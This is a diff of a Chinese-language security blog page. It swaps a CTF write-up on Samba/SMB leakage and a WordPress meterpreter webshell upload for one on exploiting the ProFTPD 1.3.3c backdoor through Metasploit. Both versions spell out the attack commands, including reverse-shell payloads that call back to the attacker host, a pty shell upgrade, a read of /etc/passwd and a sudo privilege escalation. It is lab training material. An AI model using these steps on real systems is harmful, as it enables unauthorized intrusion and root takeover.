@@ -13,24 +13,30 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/09/11/sambasmb信息泄露（serve-message-block/"/>
+    <link rel="canonical" href="http://example.com/2024/09/11/602e2b077e4b/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Samba&#x2F;SMB信息泄露Serve Message Block &#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D; &#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D; SMB协议用来访问网络资源，下载对应的资源文件 信息探测nmap -sV ip 探测开放服务 nmap -A -v -T4 ip 探测全部信息（T4——最大线程速度）">
+        <meta name="description" content="FTP服务后门利用1. 信息探测12nmap -sV IP # 扫描主机服务信息以及服务版本namp -A -v -T4 IP # 最大线程扫描主机所有信息  发现FTP服务（端口号为21） 记录FTP软件名以及版本号 2. 漏洞利用1.漏洞查找1.1SearchSploit”漏洞查找工具 “SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SambaSMB信息泄露（Serve Message Block)">
-<meta property="og:url" content="http://example.com/2024/09/11/SambaSMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88Serve-Message-Block/index.html">
+<meta property="og:title" content="FTP服务后门利用">
+<meta property="og:url" content="http://example.com/2024/09/11/602e2b077e4b/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Samba&#x2F;SMB信息泄露Serve Message Block &#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D; &#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D; SMB协议用来访问网络资源，下载对应的资源文件 信息探测nmap -sV ip 探测开放服务 nmap -A -v -T4 ip 探测全部信息（T4——最大线程速度）">
+<meta property="og:description" content="FTP服务后门利用1. 信息探测12nmap -sV IP # 扫描主机服务信息以及服务版本namp -A -v -T4 IP # 最大线程扫描主机所有信息  发现FTP服务（端口号为21） 记录FTP软件名以及版本号 2. 漏洞利用1.漏洞查找1.1SearchSploit”漏洞查找工具 “SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-09-11T10:53:11.000Z">
-<meta property="article:modified_time" content="2024-09-12T00:18:13.844Z">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png">
+<meta property="og:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png">
+<meta property="article:published_time" content="2024-09-11T10:18:55.000Z">
+<meta property="article:modified_time" content="2024-09-20T09:13:34.293Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="SMB">
+<meta property="article:tag" content="FTP">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -52,7 +58,7 @@
     
     <title>
         
-            SambaSMB信息泄露（Serve Message Block) -
+            FTP服务后门利用 -
         
         Dunm1e &#39; s World
     </title>
@@ -491,7 +497,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -499,7 +505,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -525,7 +531,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">SambaSMB信息泄露（Serve Message Block)</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">FTP服务后门利用</h1>
                 </div>
             
             </div>
@@ -546,15 +552,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 18:53:11</span>
-        <span class="mobile">2024-09-11 18:53:11</span>
+        <span class="desktop">2024-09-11 18:18:55</span>
+        <span class="mobile">2024-09-11 18:18:55</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-12 08:18:13</span>
-            <span class="mobile">2024-09-12 08:18:13</span>
+            <span class="desktop">2024-09-20 17:13:34</span>
+            <span class="mobile">2024-09-20 17:13:34</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -596,7 +602,7 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/SMB/">SMB</a>&nbsp;
+                        | <a href="/tags/FTP/">FTP</a>&nbsp;
                     </li>
                 
             </ul>
@@ -606,7 +612,7 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>614 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>621 Words</span>
         </span>
     
     
@@ -630,59 +636,66 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
-<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
-<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
-<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
-<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
-<p>1. </p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+            <h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
 
-<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
-<p>连接mysql</p>
-<p><code>mysql -h ip -u user -p</code></p>
-<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
-<p><code>ssh 用户名@ip</code></p>
-<p>尝试数据库密码，密码错误</p>
-</li>
-<li><p>针对SMB协议远程溢出漏洞进行分析</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
+<p>发现FTP服务<code>（端口号为21）</code></p>
+<p>记录FTP软件名以及版本号</p>
+<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
+<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
+</blockquote>
+<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
 
-<p>发现也没有漏洞</p>
-</li>
-</ol>
-<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
-<p>扫描到网站后台目录</p>
-<p>打开并输入用户名和密码</p>
-<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
+                     
+                ></p>
+<p><strong>我们使用第二种方法</strong></p>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
 
-<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
-<p>我们将webshell上传到editor的404.php页面</p>
-<p>然后打开404页面</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
+                      alt="2"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
 
-<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
+                      alt="3"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
 
-<p>发现获得服务器的通用权限</p>
-<p>优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
+                      alt="4"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
 
-<p>查看当前计算机的用户</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
 
-<p>查看敏感用户，发现一个togie</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
+                      alt="5"
+                ></p>
+<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
+<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
 
+<p>成功获取flag</p>
 
         </div>
 
@@ -690,18 +703,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> SambaSMB信息泄露（Serve Message Block)</li>
+        <li><strong>Title:</strong> FTP服务后门利用</li>
         <li><strong>Author:</strong> Dunm1e</li>
         <li><strong>Created at
-                :</strong> 2024-09-11 18:53:11</li>
+                :</strong> 2024-09-11 18:18:55</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-12 08:18:13
+                    :</strong> 2024-09-20 17:13:34
             </li>
         
         <li>
-            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/SambaSMB信息泄露（Serve-Message-Block/
+            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/602e2b077e4b/
         </li>
         <li>
             <strong>
@@ -727,7 +740,7 @@
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/SMB/">#SMB</a>&nbsp;
+                        <a href="/tags/FTP/">#FTP</a>&nbsp;
                     </li>
                 
             </ul>
@@ -741,13 +754,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/09/11/sql%E6%B3%A8%E5%85%A5%EF%BC%88IP%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%89/"
+                        href="/2024/09/11/cfb8804dd1b5/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">sql注入（IP命令行）</span>
+                                <span class="post-nav-title-item">SambaSMB信息泄露（Serve Message Block)</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -757,10 +770,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/09/11/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"
+                        href="/2024/09/11/60ab45b83526/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">FTP服务后门利用</span>
+                                <span class="post-nav-title-item">Hello World</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -823,8 +836,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">SambaSMB信息泄露（Serve Message Block)</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Samba-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-text">Samba&#x2F;SMB信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9SMB%E5%8D%8F%E8%AE%AE%E5%BC%B1%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">针对SMB协议弱点分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9HTTP%E5%8D%8F%E8%AE%AE%E5%BC%B1%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">针对HTTP协议弱点分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99"><span class="nav-text">1. 浏览器查看网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8dirb-nicko%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 使用dirb nicko扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%B8%8A%E4%BC%A0webshell"><span class="nav-text">3.上传webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="nav-text">4. 提升权限</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">FTP服务后门利用</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8"><span class="nav-text">FTP服务后门利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">2. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE"><span class="nav-text">1.漏洞查找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">2.漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96flag"><span class="nav-text">3.获取flag</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
@@ -859,11 +872,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        11 posts in total
+                        12 posts in total
                     </span>
                     
                         <span>
-                            12.8k words in total
+                            13.3k words in total
                         </span>
                     
                 </p>
